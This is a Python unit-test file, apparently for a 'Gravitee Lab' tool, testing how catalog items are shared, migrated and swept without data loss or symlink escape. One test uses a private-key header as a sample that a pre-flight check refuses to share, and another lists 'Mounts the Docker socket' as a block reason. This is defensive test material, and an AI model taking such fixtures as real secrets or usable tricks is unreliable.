        (self.home / ".gitconfig").write_text("")
        self.patch(gitx, "run", mock.Mock(side_effect=AssertionError("git was run")))
        self.bank()
        self.share("local/bank", "lab-new", "playground")
        self.assertTrue((self.target / "playgrounds/bank/compose.yml").is_file())

    def test_it_is_a_copy_the_item_stays_and_the_check_writes_nothing(self):
        self.bank()
        before = self.tree()
        answer = self.share("local/bank", "lab-new", "playground", True)
        self.assertEqual((answer["problems"], answer["identity"], answer["audience"]), ([], None, "private"))
        self.assertEqual(self.tree(), before)
        self.share("local/bank", "lab-new", "playground")
        self.assertEqual(self.mine(), [path for path in before if path.startswith(".lab/catalogs/local/")])

    def test_a_name_the_folder_has_is_taken_and_nothing_is_overwritten(self):
        self.bank()
        self.write(".lab/catalogs/lab-new/playgrounds/bank/compose.yml", "mine")
        with self.assertRaises(CatalogError) as raised:
            self.share("local/bank", "lab-new", "playground")
        self.assertEqual(lines_of(raised.exception), ("share_exists", 409, "Shop already exists in Newer Lab fixture."))
        self.assertEqual((self.target / "playgrounds/bank/compose.yml").read_text(), "mine")
        # Not even in the instant between the look and the copy
        self.item("addon", "late", "Late", "services: {}\n")
        real = contribute.registry.units_of
        self.patch(contribute.registry, "units_of", lambda ns: {kind: [] for kind in paths.KINDS})
        self.write(".lab/catalogs/lab-new/addons/late/compose.yml", "theirs")
        with self.assertRaises(CatalogError) as raised:
            self.share("local/late", "lab-new")
        self.assertEqual(raised.exception.code, "share_exists")
        self.assertEqual((self.target / "addons/late/compose.yml").read_text(), "theirs")
        self.assertEqual(real("lab-new")["addon"], ["late", "newer"])

    def test_what_the_pre_flight_refuses_the_copy_does_not_make(self):
        self.bank(**{"README.md": "-----BEGIN PRIVATE KEY-----"})
        with self.assertRaises(CatalogError):
            self.share("local/bank", "lab-new", "playground")
        self.against = ["Mounts the Docker socket"]
        self.write(".lab/catalogs/local/playgrounds/bank/README.md", "fine")
        with self.assertRaises(ValueError):
            self.share("local/bank", "lab-new", "playground")
        self.assertFalse((self.target / "playgrounds").exists() and list((self.target / "playgrounds").iterdir()))

    def test_a_copy_that_stops_halfway_leaves_nothing_of_it(self):
        self.bank()
        self.patch(contribute.os, "rename", mock.Mock(side_effect=OSError("disk full")))
        with self.assertRaisesRegex(OSError, "disk full"):
            self.share("local/bank", "lab-new", "playground")
        self.assertEqual(list((self.target / "playgrounds").iterdir()), [], "not the hidden folder either")

    def test_a_link_in_the_folder_is_not_followed(self):
        outside = self.root.parent / "outside-the-catalog"
        outside.mkdir(exist_ok=True)
        self.addCleanup(shutil.rmtree, outside, True)
        self.bank()
        shutil.rmtree(self.target / "playgrounds", ignore_errors=True)
        os.symlink(outside, self.target / "playgrounds")
        with self.assertRaises(CatalogError):
            self.share("local/bank", "lab-new", "playground")
        self.assertEqual(list(outside.iterdir()), [], "nothing went through the link")

    def test_a_catalog_linked_to_a_folder_of_the_person_gets_the_copy_there(self):
        linked = fixtures.install(self, "lab-new", "folder", link=True)
        real = Path(linked.entry["path"])
        self.bank()
        self.share("local/bank", "lab-new", "playground")
        self.assertTrue((real / "playgrounds/bank/compose.yml").is_file())
        self.assertTrue((self.root / ".lab/catalogs/lab-new").is_symlink())

    def test_a_half_copy_a_stop_left_in_a_folder_is_swept_when_it_is_old_and_nothing_else_is_touched(self):
        outside = self.root.parent / "outside-the-sweep"
        outside.mkdir(exist_ok=True)
        self.addCleanup(shutil.rmtree, outside, True)
        (outside / "mine.txt").write_text("mine")
        old = time.time() - 2 * 24 * 3600
        for ns, kind, name, text in (("lab-new", "addons", ".share-old", "half"), ("lab-new", "addons", ".share-new", "half"),
                                     ("lab-new", "playgrounds", ".share-also-old", "half"), ("lab-new", "addons", "kept", "mine"),
                                     ("lab-new", "addons", ".hidden-old", "mine"), ("fixture", "addons", ".share-old", "theirs")):
            self.write(f".lab/catalogs/{ns}/{kind}/{name}/compose.yml", text)
        self.write(".lab/catalogs/lab-new/setups/.share-mine.yml", "half")
        os.symlink(outside, self.target / "addons/.share-link")
        for place in ("lab-new/addons/.share-old", "lab-new/playgrounds/.share-also-old", "lab-new/addons/kept",
                      "lab-new/addons/.hidden-old", "fixture/addons/.share-old", "lab-new/setups/.share-mine.yml"):
            os.utime(self.root / ".lab/catalogs" / place, (old, old))
        os.utime(self.target / "addons/.share-link", (old, old), follow_symlinks=False)
        self.assertEqual(contribute.sweep(), ["lab-new/addons/.share-link", "lab-new/addons/.share-old",
                                              "lab-new/setups/.share-mine.yml", "lab-new/playgrounds/.share-also-old"])
        self.assertEqual(sorted(path.name for path in (self.target / "addons").iterdir()), [".hidden-old", ".share-new", "kept", "newer"])
        self.assertTrue((self.root / ".lab/catalogs/fixture/addons/.share-old").is_dir(), "an install of the Lab is its sweeper's")
        self.assertEqual((outside / "mine.txt").read_text(), "mine", "a link is removed and never followed")
        self.assertEqual(contribute.sweep(), [])

    def demo(self, notes_too=True):
        """Demo, a playground of this machine that includes Notes, an add-on of this machine (the person's copy of one, it says) that
        includes Newer of the folder."""
        self.write(".lab/tested.json", json.dumps({"local/demo": [{"versions": {}, "images": {}, "at": "2026-01-01T00:00:00Z"}]}))
        self.item("addon", "notes", "Notes", 'x-gravitee:\n  kind: addon\n  name: Notes\n  copy_of: "@lab-new/newer"\n'
                  "include:\n  - ../../../lab-new/addons/newer/compose.yml\nservices: {}\n", needs=["@lab-new/newer"])
        self.item("playground", "demo", "Demo", "x-gravitee: {kind: playground, name: Demo}\ninclude:\n  - ../../addons/notes/compose.yml\n"
                  "services: {}\n", includes=["local/notes"])

    def test_what_only_this_machine_has_goes_with_the_item_in_the_same_copy(self):
        self.demo()
        answer = self.share("local/demo", "lab-new", "playground", True)
        self.assertEqual((answer["carries"], answer["reuses"]), (["Notes"], []))
        there = next(one for one in answer["destinations"] if one["id"] == "lab-new")
        self.assertEqual(there["reason"], "", "what goes with it keeps no catalog from taking it")
        self.assertEqual(self.share("local/demo", "lab-new", "playground"), {"copied": "Newer Lab fixture"})
        self.assertIn("  - ../../addons/notes/compose.yml", (self.target / "playgrounds/demo/compose.yml").read_text())
        notes = (self.target / "addons/notes/compose.yml").read_text()
        self.assertIn("  - ../newer/compose.yml", notes, "its include of the folder's own is written for its place there")
        self.assertNotIn("copy_of", notes, "an item of a catalog never says whose copy it is")
        self.assertEqual(self.stages(), [])

    def test_the_settings_of_its_own_are_named_for_the_catalog_and_the_values_follow_when_it_is_used(self):
        self.demo()
        notes = self.root / ".lab/catalogs/local/addons/notes/compose.yml"
        notes.write_text(notes.read_text().replace("services: {}\n", "services:\n  notes-app:\n    image: busybox:1.36\n"
                         "    environment: {LEVEL: \"${GRAVITEE_INTERNAL_NOTES_LEVEL:-info}\", URL: \"${OLLAMA_URL:-x}\"}\n"))
        project.forget()
        answer = self.share("local/demo", "lab-new", "playground", True)
        self.assertEqual(answer["renames"], [{"from": "GRAVITEE_INTERNAL_NOTES_LEVEL", "to": "LAB_NEW_NOTES_LEVEL"}],
                         "a setting that names no item is left as it is")
        self.share("local/demo", "lab-new", "playground")
        copied = (self.target / "addons/notes/compose.yml").read_text()
        self.assertIn("${LAB_NEW_NOTES_LEVEL:-info}", copied)
        self.assertIn("${OLLAMA_URL:-x}", copied)
        env = self.target / "addons/notes/.env"
        env.write_text("GRAVITEE_INTERNAL_NOTES_LEVEL=debug\nOTHER=1\n")
        contribute._rename_settings("addon", "@lab-new/notes")
        self.assertEqual(env.read_text(), "LAB_NEW_NOTES_LEVEL=debug\nOTHER=1\n", "the person's value, under the new name")
        self.assertNotIn("addon:@lab-new/notes", json.loads((self.root / contribute.RENAMES).read_text()))

    def test_a_rename_changes_what_reads_the_setting_not_the_names_a_container_and_its_seed_are_given(self):
        compose_text = ("x-gravitee: {kind: playground, name: Kc}\nservices:\n  kc-app:\n    image: quay.io/keycloak/keycloak:26.0\n"
                        "    environment:\n      KC_ADMIN: ${KC_ADMIN:-admin}\n      KC_LEVEL: \"$KC_LEVEL\"\n      LITERAL: $${KC_LEVEL}\n"
                        "  kc-seed:\n    image: busybox:1.36\n    environment:\n      KC_URL: ${KC_URL:-http://kc-app:8080}\n")
        files = {"playgrounds/kc/compose.yml": compose_text, "playgrounds/kc/seed/apim/apis.yaml": "url: ${KC_URL}\nother: ${KC_OTHER}\n",
                 "playgrounds/kc/README.md": "Set KC_ADMIN first.\n", "playgrounds/kc/.env.example": "KC_ADMIN=admin\n",
                 "playgrounds/kc/conf/app.yml": "admin: ${KC_ADMIN}\n"}
        copy = contribute.Copy({path: ("100644", text.encode()) for path, text in files.items()}, compose_text, compose_text, [])
        mapping = {name: f"TEAM_{name}" for name in ("KC_ADMIN", "KC_LEVEL", "KC_URL", "KC_OTHER")}
        done = {path: data.decode() for path, (_, data) in contribute._renamed(copy, "playground", "kc", mapping).files.items()}
        self.assertIn("      KC_ADMIN: ${TEAM_KC_ADMIN:-admin}\n      KC_LEVEL: \"$TEAM_KC_LEVEL\"\n      LITERAL: $${KC_LEVEL}\n",
                      done["playgrounds/kc/compose.yml"], "the container keeps the names its program reads")
        self.assertIn("      KC_URL: ${TEAM_KC_URL:-http://kc-app:8080}\n", done["playgrounds/kc/compose.yml"])
        self.assertEqual(done["playgrounds/kc/seed/apim/apis.yaml"], "url: ${KC_URL}\nother: ${TEAM_KC_OTHER}\n",
                         "the seed reads what its service is given, and a setting by its own name")
        self.assertEqual((done["playgrounds/kc/README.md"], done["playgrounds/kc/.env.example"]), ("Set TEAM_KC_ADMIN first.\n", "TEAM_KC_ADMIN=admin\n"))
        self.assertEqual(done["playgrounds/kc/conf/app.yml"], "admin: ${KC_ADMIN}\n", "what a container reads is not a setting")

    def test_what_the_target_has_already_is_the_one_included(self):
        self.demo()
        (self.target / "addons/notes").mkdir(parents=True)
        (self.target / "addons/notes/compose.yml").write_text("x-gravitee: {kind: addon, name: Notes}\nservices: {}\n")
        answer = self.share("local/demo", "lab-new", "playground", True)
        self.assertEqual((answer["carries"], answer["reuses"]), ([], ["Notes"]))
        self.share("local/demo", "lab-new", "playground")
        self.assertIn("  - ../../addons/notes/compose.yml", (self.target / "playgrounds/demo/compose.yml").read_text())
        self.assertEqual((self.target / "addons/notes/compose.yml").read_text(), "x-gravitee: {kind: addon, name: Notes}\nservices: {}\n",
                         "the target's own is left as it is")

    def test_an_item_that_includes_what_the_folder_does_not_declare_cannot_go_there(self):
        with self.assertRaises(CatalogError) as raised:
            self.share("local/scratch", "lab-new", "addon", True)
        self.assertEqual(lines_of(raised.exception), ("share_includes", 400, "Includes Echo, which is not in Newer Lab fixture."))


class Crash(BaseException):
    """A stop in the middle of a run: nothing handles it, as a power cut is not handled."""


class Ended(Seam):
    """The catalog has the item now: the personal copy gives its place to the catalog's, and its settings go with it."""

    LOCAL = ".lab/catalogs/local/addons/echo"
    THERE = ".lab/catalogs/fixture/addons/echo"

    def setUp(self):
        super().setUp()
        self.item("addon", "echo", "Echo", "services: {}\n", services=["echo-svc"], twin={"id": "echo", "name": "Fixture catalog"})
        self.units["addons"]["echo"] = {**self.units["addons"]["local/echo"], "personal": False,
                                        "twin": {"id": "local/echo", "name": "Personal"}}
        for path, text in {".env": "TOKEN=1\n", ".state/created.json": "{}", "secrets/key": "k", "README.md": "# mine\n",
                           "seed/x.json": "{}", "apps/web/.env": "X=1\n", "notes.txt": "mine"}.items():
            self.write(f"{self.LOCAL}/{path}", text)
        self.write(".lab/starred.json", json.dumps({"addon": ["local/echo", "kafka"]}))
        self.containers = self.patch(compose, "containers", return_value=({}, None))

    def use(self, uid="local/echo", kind="addon"):
        return contribute.use_catalog_version(self.units, kind, uid)

    def stars(self):
        return json.loads((self.root / ".lab/starred.json").read_text())

    def test_the_catalogs_item_is_kept_and_the_personal_one_goes(self):
        content = {path: ((self.root / path).read_bytes(), (self.root / path).stat().st_mode)
                   for path in self.tree() if path.startswith(self.THERE + "/")}
        self.assertEqual(self.use(), {"id": "echo"})
        self.assertFalse((self.root / self.LOCAL).exists())
        self.assertEqual({path: ((self.root / path).read_bytes(), (self.root / path).stat().st_mode)
                          for path in content}, content, "what the catalog installed is as it was")

    def test_the_settings_and_the_records_go_to_the_catalogs_item(self):
        self.use()
        there = self.root / self.THERE
        self.assertEqual((there / ".env").read_text(), "TOKEN=1\n")
        self.assertEqual((there / ".state/created.json").read_text(), "{}")
        self.assertEqual((there / "secrets/key").read_text(), "k")
        self.assertEqual((there / "apps/web/.env").read_text(), "X=1\n")
        # What is no settings is the catalog's own: its README is not replaced by the personal one, notes are not carried over
        # (they are set aside, not deleted)
        self.assertNotEqual((there / "README.md").read_text(), "# mine\n")
        self.assertFalse((there / "notes.txt").exists())
        self.assertEqual((self.root / ".lab/migration/kept/local/addons/echo/notes.txt").read_text(), "mine")

    def test_nothing_is_replaced_while_the_old_layout_is_being_moved(self):
        before = self.tree()
        waiting = self.patch(layout, "waiting", return_value=True)
        with self.assertRaises(RuntimeError) as caught:
            self.use()
        self.assertEqual(str(caught.exception), layers.WAITING)
        self.assertEqual(self.tree(), before)
        self.assertEqual(self.stars(), {"addon": ["local/echo", "kafka"]})
        waiting.return_value = False
        self.assertEqual(self.use(), {"id": "echo"})

    def test_the_star_and_what_started_well_follow_it(self):
        self.item("playground", "shop", "Shop", "services: {}\n", twin={"id": "shop", "name": "Fixture catalog"})
        self.write(".lab/tested.json", json.dumps({"local/shop": [{"versions": {"APIM_VERSION": "4.13.0"}, "images": {}, "at": "2026-10-01T10:00:00Z"}]}))
        self.write(".lab/starred.json", json.dumps({"addon": ["local/echo"], "playground": ["local/shop"]}))
        self.use("local/shop", "playground")
        self.use()
        self.assertEqual(self.stars(), {"addon": ["echo"], "playground": ["shop"]})
        self.assertEqual(sorted(json.loads((self.root / ".lab/tested.json").read_text())), ["shop"])

    def test_what_the_catalogs_item_has_already_wins_and_the_personal_one_is_kept_aside(self):
        self.write(f"{self.THERE}/.env", "TOKEN=theirs\n")
        self.use()
        self.assertEqual((self.root / self.THERE / ".env").read_text(), "TOKEN=theirs\n")
        self.assertEqual((self.root / ".lab/migration/kept/local/addons/echo/.env").read_text(), "TOKEN=1\n")
        self.assertFalse((self.root / self.LOCAL).exists())

    def kept(self):
        """The files set aside by the end of a share, as paths inside `kept/local/addons/echo`."""
        base = self.root / ".lab/migration/kept/local/addons/echo"
        return sorted(path.relative_to(base).as_posix() for path in base.rglob("*") if path.is_file()) if base.is_dir() else []

    def kept_stays(self, entry, because):
        """What a run that left `entry` where it was leaves: the item, its star, its records and what the catalog's item has."""
        self.assertTrue((self.root / self.LOCAL / "compose.yml").is_file(), because)
        self.assertEqual(self.stars(), {"addon": ["local/echo", "kafka"]}, because)
        self.assertTrue((self.root / self.LOCAL / entry).exists(), because)

    def test_an_entry_that_cannot_be_moved_stops_the_move_and_nothing_is_deleted(self):
        real = os.rename

        def across(source, target, *args, **kwargs):
            if os.fspath(source).endswith(f"{self.LOCAL}/.state"):
                raise OSError(errno.EXDEV, "Invalid cross-device link")
            return real(source, target, *args, **kwargs)
        with mock.patch.object(os, "rename", across), self.assertRaises(ValueError) as raised:
            self.use()
        self.assertEqual(str(raised.exception), ".lab/catalogs/local/addons/echo/.state could not be moved to "
                                                ".lab/catalogs/fixture/addons/echo. Move it by hand, then try again.")
        self.kept_stays(".state/created.json", "the records are where they were")
        self.assertFalse((self.root / self.THERE / ".state").exists())
        self.assertEqual((self.root / self.THERE / ".env").read_text(), "TOKEN=1\n", "what could move has moved")
        # Done by hand, or once the folders are on one filesystem: the move is run again and finishes
        self.assertEqual(self.use(), {"id": "echo"})
        self.assertEqual((self.root / self.THERE / ".state/created.json").read_text(), "{}")
        self.assertEqual((self.root / self.THERE / ".env").read_text(), "TOKEN=1\n")
        self.assertFalse((self.root / self.LOCAL).exists())
        self.assertEqual(self.stars(), {"addon": ["echo", "kafka"]})

    def test_every_entry_that_stays_is_named_and_a_move_alone_says_the_same(self):
        real = os.rename

        def busy(source, target, *args, **kwargs):
            if os.path.basename(os.fspath(source)) in (".state", "secrets") and self.LOCAL in os.fspath(source):
                raise OSError(errno.EBUSY, "Resource busy")
            return real(source, target, *args, **kwargs)
        with mock.patch.object(os, "rename", busy), self.assertRaises(ValueError) as raised:
            contribute.moved("addon", "local/echo", "echo")
        self.assertEqual(str(raised.exception), ".lab/catalogs/local/addons/echo/.state, .lab/catalogs/local/addons/echo/secrets "
                                                "could not be moved to .lab/catalogs/fixture/addons/echo. Move them by hand, "
                                                "then try again.")
        self.assertEqual(self.stars(), {"addon": ["local/echo", "kafka"]}, "the star follows when the move is whole")

    def test_a_place_in_kept_that_is_taken_too_stops_the_move_and_the_settings_are_not_lost(self):
        self.write(f"{self.THERE}/.env", "TOKEN=theirs\n")
        self.write(".lab/migration/kept/local/addons/echo/.env", "TOKEN=OLD-KEPT\n")
        with self.assertRaises(ValueError) as raised:
            self.use()
        self.assertEqual(str(raised.exception), ".lab/catalogs/local/addons/echo/.env could not be moved to "
                                                ".lab/catalogs/fixture/addons/echo. Move it by hand, then try again.")
        self.kept_stays(".env", "the settings are where they were")
        self.assertEqual((self.root / self.LOCAL / ".env").read_text(), "TOKEN=1\n")
        self.assertEqual((self.root / self.THERE / ".env").read_text(), "TOKEN=theirs\n")
        self.assertEqual((self.root / ".lab/migration/kept/local/addons/echo/.env").read_text(), "TOKEN=OLD-KEPT\n")
        os.unlink(self.root / ".lab/migration/kept/local/addons/echo/.env")   # made room for
        self.assertEqual(self.use(), {"id": "echo"})
        self.assertEqual((self.root / ".lab/migration/kept/local/addons/echo/.env").read_text(), "TOKEN=1\n")

    def test_a_folder_both_items_have_is_merged_and_only_a_file_whose_place_is_taken_is_kept(self):
        """`apps/web` holds only settings in the personal item and the app in the catalog's: the settings go beside the app
        (a rename of the whole folder is refused, its place is taken); what the catalog's item has wins, and is not lost
        in the personal one: that file alone is kept aside."""
        self.write(f"{self.THERE}/apps/web/Dockerfile", "FROM busybox\n")
        self.write(f"{self.THERE}/apps/web/.env", "X=theirs\n")
        self.write(f"{self.LOCAL}/apps/web/server.key", "key")
        self.write(f"{self.LOCAL}/apps/api/.env", "A=1\n")   # a folder the catalog's item lacks goes whole
        self.assertEqual(self.use(), {"id": "echo"})
        there = self.root / self.THERE
        self.assertEqual([(there / path).read_text() for path in ("apps/web/Dockerfile", "apps/web/.env", "apps/web/server.key",
                                                                  "apps/api/.env")],
                         ["FROM busybox\n", "X=theirs\n", "key", "A=1\n"])
        self.assertEqual(self.kept(), ["apps/web/.env", "notes.txt"])
        self.assertEqual((self.root / ".lab/migration/kept/local/addons/echo/apps/web/.env").read_text(), "X=1\n")
        self.assertFalse((self.root / self.LOCAL).exists())

    def test_the_records_and_the_secrets_of_two_items_are_never_mixed(self):
        self.write(f"{self.THERE}/.state/b.json", "theirs")
        self.write(f"{self.THERE}/secrets/other", "theirs")
        self.write(f"{self.LOCAL}/.state/a.json", "mine")
        self.use()
        there = self.root / self.THERE
        self.assertEqual(sorted(path.name for path in (there / ".state").iterdir()), ["b.json"])
        self.assertEqual(sorted(path.name for path in (there / "secrets").iterdir()), ["other"])
        self.assertEqual(self.kept(), [".state/a.json", ".state/created.json", "notes.txt", "secrets/key"])

    def test_a_state_or_a_secrets_folder_deeper_in_a_folder_that_is_merged_is_not_mixed_either(self):
        self.write(f"{self.THERE}/apps/web/Dockerfile", "FROM busybox\n")
        self.write(f"{self.THERE}/apps/web/.state/theirs.json", "theirs")
        self.write(f"{self.THERE}/apps/web/secrets/theirs", "theirs")
        self.write(f"{self.LOCAL}/apps/web/.state/mine.json", "mine")
        self.write(f"{self.LOCAL}/apps/web/secrets/mine", "mine")
        self.write(f"{self.LOCAL}/apps/web/server.key", "key")
        self.use()
        there = self.root / self.THERE / "apps/web"
        self.assertEqual((sorted(path.name for path in (there / ".state").iterdir()), sorted(path.name for path in (there / "secrets").iterdir()),
                          (there / "server.key").read_text()), (["theirs.json"], ["theirs"], "key"))
        self.assertEqual(self.kept(), ["apps/web/.state/mine.json", "apps/web/secrets/mine", "notes.txt"])

    def test_a_link_where_the_catalogs_item_has_the_name_is_kept_whole_and_the_folder_behind_it_is_never_entered(self):
        """A person links `.env` to a file they share between machines, and `secrets` to a folder: the catalog's item has both
        names. The links are kept as links, and what they lead to is not touched, merged or moved."""
        os.makedirs(self.root / "elsewhere/keys")
        (self.root / "elsewhere/shared.env").write_text("E=1\n", encoding="utf-8")
        (self.root / "elsewhere/keys/one").write_text("k", encoding="utf-8")
        self.write(f"{self.THERE}/.env", "TOKEN=theirs\n")
        self.write(f"{self.THERE}/secrets/other", "theirs")
        for name in (".env", "secrets"):
            path = self.root / self.LOCAL / name
            shutil.rmtree(path) if path.is_dir() else path.unlink()
        os.symlink("../../../../../elsewhere/shared.env", self.root / self.LOCAL / ".env")
        os.symlink("../../../../../elsewhere/keys", self.root / self.LOCAL / "secrets")
        self.assertEqual(self.use(), {"id": "echo"})
        there, kept = self.root / self.THERE, self.root / ".lab/migration/kept/local/addons/echo"
        self.assertEqual(((there / ".env").read_text(), sorted(path.name for path in (there / "secrets").iterdir())),
                         ("TOKEN=theirs\n", ["other"]))
        self.assertTrue((kept / ".env").is_symlink() and (kept / "secrets").is_symlink(), "kept as the links they are")
        self.assertEqual(((self.root / "elsewhere/shared.env").read_text(), (self.root / "elsewhere/keys/one").read_text()),
                         ("E=1\n", "k"))

    def test_a_merge_that_stops_is_run_again_to_the_end_and_nothing_is_lost(self):
        self.write(f"{self.THERE}/apps/web/Dockerfile", "FROM busybox\n")
        self.write(f"{self.THERE}/apps/web/.env", "X=theirs\n")
        self.write(f"{self.LOCAL}/apps/web/server.key", "key")
        self.write(".lab/migration/kept/local/addons/echo/apps/web/.env", "OLDER\n")   # the place for the file that loses is taken
        with self.assertRaises(ValueError) as raised:
            self.use()
        self.assertIn("apps could not be moved to .lab/catalogs/fixture/addons/echo", str(raised.exception))
        self.kept_stays("apps/web/.env", "the settings are where they were")
        self.assertEqual((self.root / self.THERE / "apps/web/server.key").read_text(), "key", "what could move has moved")
        self.assertEqual(self.stars(), {"addon": ["local/echo", "kafka"]})
        os.unlink(self.root / ".lab/migration/kept/local/addons/echo/apps/web/.env")   # room made
        self.assertEqual(self.use(), {"id": "echo"})
        self.assertEqual((self.root / ".lab/migration/kept/local/addons/echo/apps/web/.env").read_text(), "X=1\n")
        self.assertEqual((self.root / self.THERE / "apps/web/.env").read_text(), "X=theirs\n")
        self.assertFalse((self.root / self.LOCAL).exists())

    def test_what_the_folder_holds_besides_the_item_is_set_aside_and_the_scratch_is_dropped(self):
        for path, text in {"data/db.sqlite": "rows", "notes/todo.txt": "todo", ".git/HEAD": "ref: x", ".DS_Store": "x",
                           "__pycache__/a.pyc": "x", "notes.txt~": "x", ".compose.yml.check.yml": "x"}.items():
            self.write(f"{self.LOCAL}/{path}", text)
        os.symlink("data/db.sqlite", self.root / self.LOCAL / "latest")
        self.assertEqual(self.use(), {"id": "echo"})
        self.assertEqual(self.kept(), [".git/HEAD", "data/db.sqlite", "latest", "notes.txt", "notes/todo.txt"])
        self.assertTrue((self.root / ".lab/migration/kept/local/addons/echo/latest").is_symlink(), "a link moves as a link")
        self.assertEqual((self.root / ".lab/migration/kept/local/addons/echo/data/db.sqlite").read_text(), "rows")
        self.assertFalse((self.root / self.LOCAL).exists())
        # The item itself, and what a share takes, is the catalog's version now: it is not kept
        self.assertNotIn("compose.yml", self.kept())
        self.assertNotIn("README.md", self.kept())

    def test_a_file_the_compose_file_names_went_with_a_share_and_is_not_set_aside_but_its_neighbors_are(self):
        self.write(f"{self.LOCAL}/compose.yml", "services:\n  echo-svc:\n    image: busybox\n    volumes:\n"
                                                "      - ./conf/app.conf:/etc/app.conf\n")
        for path in ("conf/app.conf", "conf/other.conf", "data/x"):
            self.write(f"{self.LOCAL}/{path}", path)
        self.use()
        self.assertEqual(self.kept(), ["conf/other.conf", "data/x", "notes.txt"])

    def test_a_setting_in_a_folder_that_is_set_aside_still_goes_to_the_catalogs_item(self):
        self.write(f"{self.LOCAL}/conf/server.key", "key")
        self.write(f"{self.LOCAL}/conf/app.txt", "app")
        self.use()
        self.assertEqual((self.root / self.THERE / "conf/server.key").read_text(), "key")
        self.assertEqual(self.kept(), ["conf/app.txt", "notes.txt"])

    def test_a_compose_file_that_is_the_whole_folder_leaves_nothing_to_set_aside(self):
        self.write(f"{self.LOCAL}/compose.yml", "services:\n  echo-svc:\n    build: .\n")
        self.write(f"{self.LOCAL}/data/x", "x")
        self.use()
        self.assertEqual(self.kept(), [])

    def test_a_leftover_that_cannot_be_set_aside_stops_before_the_settings_move_and_nothing_is_deleted(self):
        self.write(f"{self.LOCAL}/data/db", "rows")
        self.write(".lab/migration/kept/local/addons/echo/data/old", "older")
        with self.assertRaises(ValueError) as raised:
            self.use()
        self.assertEqual(str(raised.exception), ".lab/catalogs/local/addons/echo/data could not be set aside in "
                                                ".lab/migration/kept. Move it by hand, then try again.")
        self.kept_stays("data/db", "nothing is deleted")
        self.assertEqual((self.root / self.LOCAL / ".env").read_text(), "TOKEN=1\n")
        self.assertTrue((self.root / self.LOCAL / ".state/created.json").is_file())
        self.assertFalse((self.root / self.THERE / ".env").exists(), "the settings have not moved")
        self.assertEqual(self.kept(), ["data/old", "notes.txt"], "what could be set aside is safe there")
        shutil.rmtree(self.root / ".lab/migration/kept/local/addons/echo/data")
        self.assertEqual(self.use(), {"id": "echo"})
        self.assertEqual(self.kept(), ["data/db", "notes.txt"])

    def test_a_move_the_lab_will_not_make_for_a_leftover_leaves_the_item_where_it_is(self):
        self.write(f"{self.LOCAL}/data/db", "rows")
        real = moves.relocate

        def refuse(source, target, why):
            if why == "use-catalog-leftover":
                raise moves.Refused("data is tracked by git: it is not moved")
            return real(source, target, why)
        self.patch(moves, "relocate", refuse)
        with self.assertRaisesRegex(ValueError, "is tracked by git"):
            self.use()
        self.kept_stays("data/db", "refused")

    def test_a_twin_that_cannot_run_here_is_not_put_in_place_of_the_copy_that_does(self):
        before, twin = self.tree(), dict(self.units["addons"]["echo"])
        for label, fields, said in (("blocked", {"blocked": {"reasons": ["Needs Lab level 9", "Mounts the Docker socket"]}},
                                     "Needs Lab level 9; Mounts the Docker socket"),
                                    ("a newer Lab", {"compat": "new"}, "Needs a newer Gravitee Lab"),
                                    ("an older Lab", {"compat": "old"}, "Written for an older Gravitee Lab"),
                                    ("a catalog it lacks", {"needs_catalogs": [{"id": "gone", "name": "Gone catalog"}, {"id": "x"}]},
                                     "Needs Gone catalog, x")):
            self.units["addons"]["echo"] = {**twin, **fields}
            with self.subTest(label), self.assertRaises(ValueError) as raised:
                self.use()
            self.assertEqual(str(raised.exception), f"Echo in Fixture catalog cannot run on this machine: {said}. "
                                                    "Your copy stays until it can.")
        self.assertEqual(self.tree(), before)
        self.assertEqual(self.stars(), {"addon": ["local/echo", "kafka"]})
        self.units["addons"]["echo"] = {**twin, "blocked": None, "needs_catalogs": [], "compat": "ok"}
        self.assertEqual(self.use(), {"id": "echo"})

    def test_a_twin_the_catalog_dropped_while_the_lock_was_asked_for_makes_no_folder(self):
        real = contribute._off

        def drop(*args):
            real(*args)
            os.chmod(self.root / self.THERE, 0o755)
            shutil.rmtree(self.root / self.THERE)
        self.patch(contribute, "_off", drop)
        with self.assertRaisesRegex(ValueError, "^Echo is not in a catalog you have. Update the catalog that holds it first.$"):
            self.use()
        self.assertFalse((self.root / self.THERE).exists(), "nothing was written where the unit was")
        self.kept_stays(".env", "the item is where it was")

    def test_moved_makes_no_folder_for_a_unit_that_is_not_there(self):
        before = self.tree()
        for new in ("@nowhere/echo", "nowhere"):
            with self.subTest(new), self.assertRaisesRegex(ValueError, f"^{new} is not an item of a catalog you have$"):
                contribute.moved("addon", "local/echo", new)
        self.assertEqual(self.tree(), before)
        self.assertFalse((self.root / ".lab/catalogs/nowhere").exists())

    def test_the_items_of_this_machine_that_included_it_include_the_catalogs_now(self):
        self.item("addon", "user", "User", "include:\n  - ../echo/compose.yml\nservices: {}\n")
        self.use()
        self.assertEqual((self.root / ".lab/catalogs/local/addons/user/compose.yml").read_text(),
                         "include:\n  - ../../../fixture/addons/echo/compose.yml\nservices: {}\n")

    def test_not_while_either_is_on_and_nothing_changes(self):
        before = self.tree()
        for which, uid in (("the personal one", "local/echo"), ("its twin", "echo")):
            self.write(paths.ON_FILE, f"include:\n  - {paths.unit_file('addon', uid)}\n")
            with self.subTest(which):
                with self.assertRaises(CatalogError) as raised:
                    self.use()
                self.assertEqual(lines_of(raised.exception), ("held", 409, "Turn off Echo first."))
        self.containers.return_value = ({"echo-svc": {"state": "running"}}, None)
        with self.assertRaises(CatalogError) as raised:
            self.use()
        self.assertEqual(lines_of(raised.exception), ("held", 409, "Stop Echo first."))
        os.unlink(self.root / paths.ON_FILE)
        self.assertEqual(self.tree(), before)
        self.assertEqual(self.stars(), {"addon": ["local/echo", "kafka"]})

    def test_a_move_the_lab_will_not_make_leaves_the_item_where_it_is(self):
        self.patch(moves, "relocate", mock.Mock(side_effect=moves.Refused(".lab/catalogs/local/addons/echo/.env is tracked by git: it is not moved")))
        with self.assertRaisesRegex(ValueError, "is tracked by git"):
            self.use()
        self.assertTrue((self.root / self.LOCAL / "compose.yml").is_file())
        self.assertEqual(self.stars(), {"addon": ["local/echo", "kafka"]})

    def test_docker_is_asked_only_for_what_is_on(self):
        self.use()
        self.containers.assert_not_called()

    def test_an_item_that_is_not_in_a_catalog_has_nothing_to_use(self):
        self.units["addons"]["local/echo"].pop("twin")
        before = self.tree()
        with self.assertRaisesRegex(ValueError, "^Echo is not in a catalog you have. Update the catalog that holds it first.$"):
            self.use()
        self.units["addons"]["local/echo"]["twin"] = {"id": "echo", "name": "Fixture catalog"}
        os.chmod(self.root / self.THERE, 0o755)
        shutil.rmtree(self.root / self.THERE)   # the catalog dropped it since
